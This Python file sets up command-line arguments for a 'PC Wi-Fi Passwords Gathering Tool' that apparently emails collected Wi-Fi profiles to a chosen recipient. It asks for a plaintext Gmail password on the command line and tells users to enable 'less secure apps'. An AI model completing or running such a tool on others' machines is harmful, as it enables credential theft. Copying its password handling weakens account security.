import argparse
from argparse import  RawTextHelpFormatter

__version__ ='''
 Author: mr_shanmuk\n
 Github: githhub.com/shanmukmichael\n
 PC Wi-Fi Passwords Gathering Tool Version : v1.0\n
'''
__description__= '''
 Author: mr_shanmuk\n
 Github: https://github.com/shanmukmichael\n
 NOTE : for sending mail you should turn on less secure apps option : https://myaccount.google.com/lesssecureapps\n
 PC Wi-Fi Passwords Gathering Tool\n ---------------------------------'''

def cmd_setup():
    parser = argparse.ArgumentParser(description=__description__, formatter_class=RawTextHelpFormatter)
    parser._action_groups.pop()
    required = parser.add_argument_group(' required arguments')

    required.add_argument('-s', type=str,
                        help=': sender mail id Ex: -s shanmukmichael@gmail.com', required=True)

    required.add_argument('-p', type=str,
                        help=': sender mail password Ex: -p password123', required=True)

    required.add_argument('-r', type=str,
                        help=': receiver mail id Ex: -r shanmukmichael@gmail.com', required=True)

    optional = parser.add_argument_group(' optional arguments')

    optional.add_argument('-f', type=str, default='Wi-Fi_Profiles.pdf',
                        help=''': filename with .txt (or) .pdf extension\n  DEFAULT filename set as Wi-Fi_Profiles.pdf''')

    optional.add_argument('-v', '--version', action='version', version=__version__, help=": show tool version")

    args = parser.parse_args()

    return args.s, args.p, args.r, args.f
